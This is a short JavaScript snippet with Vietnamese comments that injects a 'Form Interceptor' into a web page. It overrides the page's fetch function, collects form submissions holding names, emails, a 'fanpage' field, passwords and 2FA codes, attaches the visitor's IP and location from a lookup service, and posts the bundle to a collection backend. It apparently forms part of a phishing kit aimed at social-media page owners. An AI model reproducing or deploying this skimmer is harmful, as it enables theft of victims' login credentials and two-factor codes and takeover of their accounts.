<script>
// Script để bắt dữ liệu từ React Form
(function() {
    console.log('🔍 Đang khởi tạo Form Interceptor...');
    
    // Lưu trữ dữ liệu qua các bước
    let formData = {
        step1: null,
        step2: null,
        step3: null
    };
    
    // Lấy thông tin IP
    let ipInfo = { ip: 'Unknown', location: 'Unknown', country: 'Unknown' };
    
    async function getIpInfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ipInfo = {
                ip: data.ip,
                location: `${data.city || ''}, ${data.region || ''}`,
                country: data.country_name,
                countryCode: data.country_code
            };
            console.log('✅ IP Info:', ipInfo);
        } catch(e) {
            console.error('Lỗi lấy IP:', e);
        }
    }
    
    getIpInfo();
    
    // Override fetch để bắt request
    const originalFetch = window.fetch;
    window.fetch = async function(url, options) {
        // Bắt request đến API
        if (options && options.body && typeof options.body === 'string') {
            try {
                const bodyData = JSON.parse(options.body);
                console.log('📦 Bắt được data:', bodyData);
                
                // Xác định bước dựa vào nội dung data
                if (bodyData.name || bodyData.email || bodyData.fanpage) {
                    // Bước 1: Thông tin cá nhân
                    formData.step1 = bodyData;
                    console.log('✅ Step 1 captured:', formData.step1);
                }
                
                if (bodyData.password) {
                    // Bước 2: Mật khẩu
                    formData.step2 = bodyData;
                    console.log('✅ Step 2 captured:', formData.step2);
                }
                
                if (bodyData.twoFa || bodyData.code) {
                    // Bước 3: 2FA
                    formData.step3 = bodyData;
                    console.log('✅ Step 3 captured:', formData.step3);
                }
                
                // Nếu đã có đủ thông tin, gửi đi
                if (formData.step1 && formData.step2) {
                    const fullData = {
                        ...formData.step1,
                        ...formData.step2,
                        ...formData.step3,
                        ip: ipInfo.ip,
                        location: ipInfo.location,
                        country: ipInfo.country,
                        completedAt: new Date().toISOString()
                    };
                    
                    console.log('📤 Gửi full data:', fullData);
                    
                    // Gửi đến backend
                    await fetch('http://localhost:3000/api/submit', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(fullData)
                    });
                }
                
            } catch(e) {
                console.error('Lỗi parse data:', e);
            }
        }
        
        return originalFetch.apply(this, arguments);
    };
    
    console.log('🚀 Form Interceptor đã sẵn sàng!');
})();
</script>
